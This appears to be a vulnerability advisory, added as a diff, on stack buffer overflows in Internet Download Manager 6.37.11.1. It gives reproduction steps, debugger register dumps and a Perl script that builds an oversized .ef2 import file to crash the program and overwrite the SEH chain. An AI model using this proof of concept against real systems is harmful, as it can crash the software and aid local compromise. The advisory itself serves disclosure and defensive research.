@@ -1,0 +1,193 @@
+# Title: Internet Download Manager 6.37.11.1 - Stack Buffer Overflow (PoC)
+# Author: Vulnerability Laboratory
+# Date: 2020-04-28
+# Vendor: https://www.internetdownloadmanager.com
+# Software: https://www.internetdownloadmanager.com/download.html
+# CVE: N/A
+
+Document Title:
+===============
+Internet Download Manager v6.37.11.1 - Stack Buffer Overflow Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2236
+
+
+Common Vulnerability Scoring System:
+====================================
+7.1
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-28: Public Disclosure (Vulnerability Laboratory)
+(Copy of the Homepage:
+https://www.internetdownloadmanager.com/support/about_us.html )
+(Sofwtare Product: https://www.internetdownloadmanager.com/download.html)
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+Multiple stack buffer overflow vulnerabilities has been discovered in
+the official Internet Download Manager v6.37.11.1 software.
+The bufer overflow allows to overwrite registers of the process to
+compromise the file-system by elevates local process privileges.
+
+1.1
+The first stack buffer overflow is located in the `search` function of
+the downloads menu. The search function itself does not use
+any secure restriction in the requested search variable of the inputs.
+Local attackers with access to the software are able to overflow
+the registers to elevate local process privileges. Thus allows a local
+attacker to compromise the local computer- or file-system.
+
+1.2
+The second stack buffer overflow is located in the `Export/Import`
+function of the tasks menu. Local users are able to import and
+export the download tasks as *.ef2 file. Local attackers are able to
+import manipulated *.ef2 files with manipulated referer and
+source url to overwrite the eip register. The issue occurs because of
+the insufficient ef2 filetype (context) validation process
+that does not perform any length restrictions.
+
+The security risk of the local stack buffer overflow vulnerabilities in
+the software are estimated as high with a cvss count of 7.1.
+Exploitation of the buffer overflow vulnerability requires a low
+privilege or restricted system user account without user interaction.
+Successful exploitation of the vulnerability results in overwrite of the
+active registers to compromise of the computer system or process.
+
+Vulnerable Module(s):
+[+] Search
+[+] Import/Export (ef2)
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The stack buffer overflow vulnerability can be exploited by local
+attackers with system user privileges without user interaction.
+For security demonstration or to reproduce the local vulnerability
+follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open the software
+2. Click the downloads menu and open the search
+3. Inject a large unicode payload inside the search input field and transmit
+4. The software crashs with several uncaught exception because of
+overwritten register (0168D8F0)
+5. Successful reproduce of the local buffer overflow vulnerability!
+
+
+--- Debug Logs (0168D8F0) ---
+00d61850 668b08          mov     cx,word ptr [eax]        ds:002b:41414141
+-
+00D6186D  |. 56             PUSH ESI                                 ; /Arg1
+-
+00D61882  |. E8 59FFFFFF    CALL IDMan.00D617E0                      ;
+IDMan.00D617E0
+-
+00D6189B  |> 50             PUSH EAX                                 ; /Arg1
+-
+00D6189E  |. E8 3DFFFFFF    CALL IDMan.00D617E0                      ;
+IDMan.00D617E0
+-
+Call stack
+ Address=0168C79C
+ Stack=00DFE0F2
+ Procedure / arguments=IDMan.00D617E0
+ Called from=IDMan.00DFE0ED
+ Frame=0168E02C
+-
+SEH chain
+Address    SE handler
+0168C790   IDMan.00F751E8
+0168D8F0   41414141
+-
+EAX 41414141
+ECX 01680000
+EDX 41414141
+EBX 00000001
+ESP 0168C76C
+EBP 0168E02C UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
+ESI 0168C7AC UNICODE "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
+EDI 00410043
+EIP 00D61850 IDMan.00D61850
+Executable modules
+ Base=00D60000
+ Size=00539000 (5476352.)
+ Entry=00F5CB1C IDMan.<ModuleEntryPoint>
+ Name=IDMan
+ File version=6, 37, 11, 2
+ Path=C:Program Files (x86)Internet Download ManagerIDMan.exe
+
+
+1.2
+The stack buffer overflow vulnerability can be exploited by local
+attackers with system user privileges without user interaction.
+For security demonstration or to reproduce the local vulnerability
+follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open the software
+2. Start the bof_poc.pl
+3. Open the tasks menu
+4. Click import and import *.ef2 poc
+Note: The software process crashs on import with uncaught exception
+5. Successful reproduce of the local buffer overflow vulnerability!
+
+
+Usage Example: Export/Import (*.ef2)
+<
+https://www.vulnerability-lab.com/download_content.php?id=1337
+referer: https://www.vulnerability-lab.com/
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+>
+
+
+PoC: Exploit
+#!/usr/bin/perl
+# Local Stack Buffer Overflow Exploit for Internet Download Manager
+v6.37.11.1
+# Vulnerability Laboratory - Benjamin Kunz Mejri
+my $poc = "bof_poc.ef2" ;
+print "[+] Producing bof_poc.ef2 ..." ;
+my $buff0=" "."<" x 1;
+my $buff1=" n https://"."A" x 1024;
+my $buff2=" n Referer:"."A" x 1024;
+my $buff3=" n User Agent:"."A" x 1024;
+my $buff4=" n ".">" x 1;
+open(ef2, ">>$poc") or die "Cannot open $poc";
+print ef2 $buff0;
+print ef2 $buff1;
+print ef2 $buff2;
+print ef2 $buff3;
+print ef2 $buff4;
+close(ef2);
+print "n[+] done !";
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
